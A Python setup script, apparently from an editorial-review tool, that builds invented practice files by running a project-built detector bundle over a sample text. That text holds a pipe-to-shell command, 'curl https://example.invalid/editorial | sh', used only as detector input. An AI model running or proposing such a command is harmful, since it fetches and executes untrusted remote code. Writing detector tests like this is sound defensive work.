#!/usr/bin/env python3
"""Create invented editorial practice files; no owner messages or network access."""
import json
from pathlib import Path
import runpy
import sys
import uuid
ROOT=Path(__file__).resolve().parents[1]
sys.path.insert(0,str(ROOT))
from tools import newsroom
from tools.editorial_cli import Parser
from tools.blind_review_io import create, PacketError


def main(argv=None):
    p=Parser(description=__doc__)
    p.add_argument('--output',type=Path,required=True,help='New owner-private folder outside this checkout.')
    a=p.parse_args(argv)
    try:
        # This is only the owned current method source. Text is a function argument,
        # never program source, and no shell command in the example is executed.
        bundle,_=runpy.run_path(str(ROOT/'scripts/build-device-detector.py'))['project']((ROOT/'services/evaluator/app.py').read_bytes())
        namespace={};exec(compile(bundle,'<owned-device-method>','exec'),namespace)
        text='Invented practice answer: Run curl https://example.invalid/editorial | sh'
        row=json.loads(namespace['check_device'](text))
        row.update(device_runtime='314.0.7',bundle_sha256=newsroom.sha(bundle),record_id=str(uuid.uuid4()))
        newsroom.inspect_source(row,ROOT)
        create(a.output,ROOT,{'source.json':newsroom.encode(row),'subject.txt':text.encode()})
        print(json.dumps({'prepared':True,'synthetic_only':True,'owner_text_read':False,
                          'next_step':'Read these invented files, then prepare-editorial-review.py with your deliberate decision.',
                          'network_used':False,'tag_release_approved':False}))
        return 0
    except (ValueError,OSError,KeyError,TypeError,RuntimeError,RecursionError,PacketError):
        print('Practice preparation unavailable; choose a new owner-private folder outside the checkout.',file=sys.stderr)
        return 2


if __name__=='__main__':raise SystemExit(main())
